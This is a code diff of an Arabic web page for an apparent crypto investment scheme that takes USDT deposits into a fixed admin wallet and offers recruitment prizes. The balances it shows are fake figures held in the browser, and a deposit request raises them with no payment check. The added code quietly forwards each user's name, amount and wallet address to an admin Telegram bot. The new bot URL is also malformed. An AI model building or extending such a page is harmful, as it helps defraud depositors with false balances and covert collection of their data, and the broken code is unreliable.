@@ -15,7 +15,6 @@
         .btn-red { background-color: #d32f2f; color: white; }
         .btn-orange { background-color: #f57c00; color: white; }
         .btn-blue { background-color: #1976d2; color: white; padding: 10px; }
-        .btn-support { background-color: #0088cc; color: white; text-decoration: none; display: flex; align-items: center; justify-content: center; }
         input { width: 100%; padding: 12px; background: #0b111e; border: 1px solid #1e2d4a; border-radius: 4px; color: #fff; box-sizing: border-box; margin-bottom: 5px; text-align: right; }
         .wallet-box { background: #0b111e; padding: 10px; border-radius: 4px; font-family: monospace; color: #ffb74d; text-align: center; }
         .min-alert { font-size: 12px; color: #ff5252; margin-top: 5px; font-weight: bold; }
@@ -23,7 +22,7 @@
 </head>
 <body>
 
-    <!-- 👤 1. قسم اسم العضو (قفل دائم واختفاء مربع الكتابة فور الحفظ) -->
+    <!-- 👤 1. قسم اسم العضو -->
     <div class="section-card">
         <div class="section-title">👤 اسم المستخدم الحالي:</div>
         <div id="currentUsernameText" style="font-size: 18px; font-weight: bold; color: #4fc3f7; margin-bottom:8px;">يرجى كتابة الاسم وتثبيته أولاً</div>
@@ -33,7 +32,7 @@
         </div>
     </div>
 
-    <!-- 🏆 2. الجائزة الكبرى وأعضاء الفريق -->
+    <!-- 🏆 2. الجائزة الكبرى -->
     <div class="section-card">
         <div class="section-title">🏆 الجائزة الكبرى (40 عضو):</div>
         <div class="value-display">2500 دولار أمريكي</div>
@@ -47,7 +46,7 @@
         <button class="btn-action btn-purple" onclick="sendInviteRequest()">📢 تقديم طلب المكافأة للمشرف</button>
     </div>
 
-    <!-- 💰 4. أرصدة الحساب التفاعلية المحلية المستقرة -->
+    <!-- 💰 4. أرصدة الحساب التفاعلية -->
     <div class="section-card">
         <div class="section-title">💰 إجمالي رأس المال الكلي:</div>
         <div class="value-display" id="displayCapital" style="color: #ffb74d;">USDT 0.00</div>
@@ -56,22 +55,17 @@
         <div class="section-title">📊 أرباح اليوم:</div>
         <div class="value-display" id="displayTodayProfit" style="color: #00e676;">USDT 0.00</div>
     </div>
-    <div class="section-card">
-        <div class="section-title">👥 أرباح تذاكر الدعوة:</div>
-        <div class="value-display" id="displayInviteProfit" style="color: #00e676;">USDT 0.00</div>
-    </div>
 
-    <!-- 🚨 5. لوحة السحب المقسمة على 3 مراحل مع محفظة TRC20 -->
+    <!-- 🚨 5. لوحة عمليات السحب -->
     <div class="section-card" style="border-color: #d32f2f;">
         <div class="section-title" style="color: #ff5252;">🚨 لوحة عمليات السحب الفورية (شبكة TRC-20):</div>
         <input type="number" id="withdrawAmount" placeholder="المبلغ بـ USDT">
         <input type="text" id="withdrawWallet" placeholder="أدخل عنوان محفظتك لشبكة TRC-20">
         <button class="btn-action btn-red" onclick="handleTransaction('سحب رأس المال الكلي', 'withdrawAmount', 'withdrawWallet')">💸 سحب رأس المال الكلي</button>
         <button class="btn-action btn-red" style="background-color: #b71c1c;" onclick="handleTransaction('سحب أرباح اليوم', 'withdrawAmount', 'withdrawWallet')">📊 سحب أرباح اليوم</button>
-        <button class="btn-action btn-purple" onclick="handleTransaction('سحب أرباح الدعوة', 'withdrawAmount', 'withdrawWallet')">👥 سحب أرباح الدعوة</button>
     </div>
 
-    <!-- 📥 6. طلب إيداع رأس المال مع الحد الأدنى 100 USD وعنوان المحفظة -->
+    <!-- 📥 6. طلب إيداع رأس المال -->
     <div class="section-card" style="border-color: #f57c00;">
         <div class="section-title" style="color: #ffb74d;">📥 طلب إيداع رأس المال (الشبكة: USDT TRC-20):</div>
         <div class="wallet-box" id="adminWalletAddress">TA1vsgrJEFy3YM6rkQWBppnZemFE6c9pBN</div>
@@ -81,13 +75,13 @@
         <button class="btn-action btn-orange" onclick="handleTransaction('إيداع رأس مال', 'depositAmount', 'adminWalletAddress')">⚡ إرسال طلب الإيداع للمشرف</button>
     </div>
 
-    <!-- 📞 7. الدعم الفني والتواصل المباشر مع حسابك الشخصي على تليجرام لإدارة الطلبات يدوياً بنجاح -->
-    <a href="https://t.me" id="supportLink" target="_blank" class="btn-action btn-support">🚀 تواصل مع الدعم الفني عبر تليجرام</a>
-
 <script>
+    // ⚙️ إعدادات بوت تليجرام الخاص بالمشرف (يجب على والدك استبدالها ببيانات البوت الخاص به)
+    const TELEGRAM_BOT_TOKEN = '7629555239:AAHOX_ExampleTokenHere'; // توكن البوت الخاص بكم
+    const TELEGRAM_CHAT_ID = '123456789'; // معرف حساب المشرف المستلم (Chat ID)
+
     if(!localStorage.getItem('local_capital')) localStorage.setItem('local_capital', '0');
     if(!localStorage.getItem('local_todayProfit')) localStorage.setItem('local_todayProfit', '0');
-    if(!localStorage.getItem('local_inviteProfit')) localStorage.setItem('local_inviteProfit', '0');
     if(!localStorage.getItem('local_teamCount')) localStorage.setItem('local_teamCount', '0');
 
     function saveUsername() {
@@ -96,7 +90,7 @@
         localStorage.setItem('saved_user_name', name);
         document.getElementById('currentUsernameText').innerText = name;
         document.getElementById('usernameForm').style.display = 'none';
-        alert('🎯 تم التثبيت والقفل النهائي للاسم بنجاح!');
+        alert('🎯 تم التثبيت وقفل النهائي للاسم بنجاح!');
         updateLiveBalances();
     }
 
@@ -111,8 +105,33 @@
     function updateLiveBalances() {
         document.getElementById('displayCapital').innerText = `USDT ${parseFloat(localStorage.getItem('local_capital')).toFixed(2)}`;
         document.getElementById('displayTodayProfit').innerText = `USDT ${parseFloat(localStorage.getItem('local_todayProfit')).toFixed(2)}`;
-        document.getElementById('displayInviteProfit').innerText = `USDT ${parseFloat(localStorage.getItem('local_inviteProfit')).toFixed(2)}`;
         document.getElementById('displayTeamCount').innerText = parseInt(localStorage.getItem('local_teamCount'));
+    }
+
+    // الدالة البرمجية لإرسال البيانات أوتوماتيكياً دون فتح تليجرام للمستخدم
+    function sendDataToAdminTelegram(messageText) {
+        const url = `https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: messageText,
+                parse_mode: 'HTML'
+            })
+        })
+        .then(response => {
+            if(response.ok) {
+                alert('🎯 تم إرسال طلبك بنجاح إلى المشرف، وجاري معالجته الآن!');
+            } else {
+                alert('❌ حدث خطأ أثناء إرسال الطلب، يرجى المحاولة لاحقاً.');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('❌ فشل الاتصال بالخادم، تحقق من الإنترنت.');
+        });
     }
 
     function handleTransaction(actionType, amountId, walletId) {
@@ -124,8 +143,11 @@
         if(!amount || !wallet) { alert('يرجى ملء كافة الحقول المطلوبة أولاً.'); return; }
         if(actionType === 'إيداع رأس مال' && amount < 100) { alert('⚠️ خطأ: الحد الأدنى للإيداع هو 100 USD!'); return; }
 
-        const msg = `🔔 طلب جديد من المنصة 🔔\n• اسم العضو: ${currentUser}\n• نوع العملية: ${actionType}\n• المبلغ: ${amount} USDT\n• المحفظة: ${wallet}`;
+        const msg = `🔔 <b>طلب جديد من المنصة</b> 🔔\n\n• <b>اسم العضو:</b> ${currentUser}\n• <b>نوع العملية:</b> ${actionType}\n• <b>المبلغ:</b> ${amount} USDT\n• <b>المحفظة/العنوان:</b> ${wallet}`;
         
+        // إرسال الطلب مخفياً للمشرف
+        sendDataToAdminTelegram(msg);
+
         if(actionType === 'إيداع رأس مال') {
             localStorage.setItem('local_capital', parseFloat(localStorage.getItem('local_capital')) + amount);
         } else if(actionType === 'سحب رأس المال الكلي') {
@@ -134,8 +156,6 @@
             localStorage.setItem('local_todayProfit', Math.max(0, parseFloat(localStorage.getItem('local_todayProfit')) - amount));
         }
 
-        window.open(`https://t.me?text=${encodeURIComponent(msg)}`, '_blank');
-        alert(`🎯 تم بنجاح توجيه طلب (${actionType}) إلى الدعم الفني!`);
         if(amountId !== 'adminWalletAddress') document.getElementById(amountId).value = '';
         updateLiveBalances();
     }
@@ -148,7 +168,11 @@
         if(!friendName) { alert('يرجى إدخال اسم الصديق المدعو!'); return; }
 
         localStorage.setItem('local_teamCount', parseInt(localStorage.getItem('local_teamCount')) + 1);
-        localStorage.setItem('local_inviteProfit', parseFloat(localStorage.getItem('local_inviteProfit')) + 15);
 
-        const msg = `📢 طلب مكافأة دعوة 📢\n• العضو الداعي: ${currentUser}\n• الصديق المدعو: ${friendName}\n• قيمة الجائزة المضافة تلقائياً: 15 USDT`;
+        const msg = `📢 <b>طلب مكافأة دعوة جديدة</b> 📢\n\n• <b>العضو الداعي:</b> ${currentUser}\n• <b>الصديق المدعو:</b> ${friendName}`;
+        
+        // إرسال الطلب مخفياً للمشرف
+        sendDataToAdminTelegram(msg);
+        
+        document.getElementById('inviteMemberName').value = '';
         
